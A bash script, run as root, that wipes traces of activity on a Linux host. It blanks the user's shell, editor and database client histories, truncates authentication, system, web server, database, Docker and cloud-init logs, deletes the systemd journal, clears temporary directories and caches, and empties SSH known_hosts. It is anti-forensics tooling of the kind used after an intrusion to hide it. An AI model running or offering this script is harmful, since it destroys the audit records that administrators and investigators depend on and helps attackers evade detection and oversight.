#!/bin/bash

if [ "$(id -u)" -ne 0 ]; then
    echo -e "\e[31m[!] This script must be run as root!\e[0m"
    exit 1
fi

echo -e "\e[32m[+] Cleaning up traces of user $USER...\e[0m"
echo "" > ~/.bash_history
echo "" > ~/.zsh_history 2>/dev/null
echo "" > ~/.viminfo 2>/dev/null
echo "" > ~/.nvimlog 2>/dev/null
echo "" > ~/.local/share/nvim/shada/* 2>/dev/null
echo "" > ~/.mysql_history 2>/dev/null
echo "" > ~/.psql_history 2>/dev/null
history -c && history -w

echo -e "\e[32m[+] Cleaning system logs...\e[0m"
log_files=(
    "/var/log/auth.log" "/var/log/syslog" "/var/log/messages"
    "/var/log/secure" "/var/log/utmp" "/var/log/wtmp"
    "/var/log/lastlog" "/var/log/btmp" "/var/log/faillog"
    
    "/var/log/cron.log" "/var/log/mail.log" "/var/log/boot.log"
    "/var/log/dpkg.log" "/var/log/apt/history.log"
    
    "/var/log/apache2/access.log" "/var/log/apache2/error.log"
    "/var/log/nginx/access.log" "/var/log/nginx/error.log"
    
    "/var/log/mysql.log" "/var/log/mysql/error.log"
    "/var/log/postgresql.log"
    
    "/var/log/docker.log"
    
    "/var/log/cloud-init.log" "/var/log/cloud-init-output.log"
)

for file in "${log_files[@]}"; do
    if [ -f "$file" ]; then
        echo -e "\e[34m[*] Cleaning file: $file\e[0m"
        : > "$file"
    elif [ -d "$file" ]; then
        echo -e "\e[34m[*] Cleaning directory contents: $file\e[0m"
        rm -rf "$file"/* 2>/dev/null
    else
        echo -e "\e[33m[!] File or directory not found: $file\e[0m"
    fi
done

if [ -d "/var/log/containers" ]; then
    for log in /var/log/containers/*.log; do
        if [ -f "$log" ]; then
            echo -e "\e[34m[*] Cleaning container log file: $log\e[0m"
            : > "$log"
        fi
    done
fi

echo -e "\e[32m[+] Cleaning session records...\e[0m"
utmpdump /var/log/wtmp > /tmp/wtmp.tmp && mv /tmp/wtmp.tmp /var/log/wtmp 2>/dev/null
utmpdump /var/log/btmp > /tmp/btmp.tmp && mv /tmp/btmp.tmp /var/log/btmp 2>/dev/null
echo "" > /var/log/lastlog 2>/dev/null

echo -e "\e[32m[+] Cleaning caches and temporary files...\e[0m"
rm -rf ~/.cache/* 2>/dev/null
rm -rf /var/cache/* 2>/dev/null
rm -rf /tmp/* 2>/dev/null
rm -rf /var/tmp/* 2>/dev/null

if command -v journalctl &>/dev/null; then
    echo -e "\e[32m[+] Cleaning journal logs...\e[0m"
    journalctl --flush --rotate 2>/dev/null
    journalctl --vacuum-time=1s 2>/dev/null
    rm -rf /var/log/journal/* 2>/dev/null
fi

echo -e "\e[32m[+] Cleaning SSH traces...\e[0m"
echo "" > ~/.ssh/known_hosts 2>/dev/null

echo -e "\e[33m\n[!] Cleanup completed!\n\e[0m"
